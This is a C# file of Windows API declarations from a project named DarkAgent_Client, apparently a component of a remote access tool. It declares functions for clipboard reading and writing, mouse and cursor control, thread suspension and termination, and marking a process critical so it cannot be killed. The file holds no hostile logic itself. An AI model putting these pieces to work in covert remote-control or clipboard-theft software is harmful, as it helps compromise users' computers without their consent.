using System;
using System.Runtime.InteropServices;
using System.Text;

namespace DarkAgent_Client.src.Objects
{
    public class APIs
    {
        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("User32.dll")]
        public static extern bool SetWindowText(Int32 hWnd, string lpstring);

        [DllImport("Kernel32.dll")]
        public static extern int ResumeThread(IntPtr hThread);

        [DllImport("Kernel32.dll")]
        public static extern uint SuspendThread(IntPtr hThread);

        [DllImport("Kernel32.dll")]
        public static extern bool TerminateThread(IntPtr hThread, Int64 dwExitCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("ntdll.dll")]
        public static extern int RtlSetProcessIsCritical(bool bNew, out bool pbOld, bool bNeedScb);

        [DllImport("Shell32.dll")]
        public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, int cbFileInfo, uint uFlags);

        [DllImport("user32.dll")]
        public static extern IntPtr GetClipboardData(uint uFormat);
	
	    [DllImport("user32.dll", SetLastError = true)]
	    public static extern bool OpenClipboard(IntPtr hWndNewOwner);
	
	    [DllImport("kernel32.dll")]
	    public static extern UIntPtr GlobalSize(IntPtr hMem);
	
	    [DllImport("kernel32.dll")]
	    public static extern IntPtr GlobalLock(IntPtr hMem);
	
	    [DllImport("user32.dll", SetLastError = true)]
	    public static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        public static extern IntPtr SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern int SetClipboardData(int uFormat, IntPtr hMem);

        [DllImport("user32.dll")]
        public static extern bool EmptyClipboard();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        [StructLayout(LayoutKind.Sequential)]
        public struct SHFILEINFO
        {
            public IntPtr hIcon;
            public int iIcon;
            public uint dwAttributes;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string szDisplayName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
            public string szTypeName;
        };

        public enum ThreadAccess
        {
            DIRECT_IMPERSONATION = 0x200,
            GET_CONTEXT = 8,
            IMPERSONATE = 0x100,
            QUERY_INFORMATION = 0x40,
            SET_CONTEXT = 0x10,
            SET_INFORMATION = 0x20,
            SET_THREAD_TOKEN = 0x80,
            SUSPEND_RESUME = 2,
            TERMINATE = 1
        }
    }
}
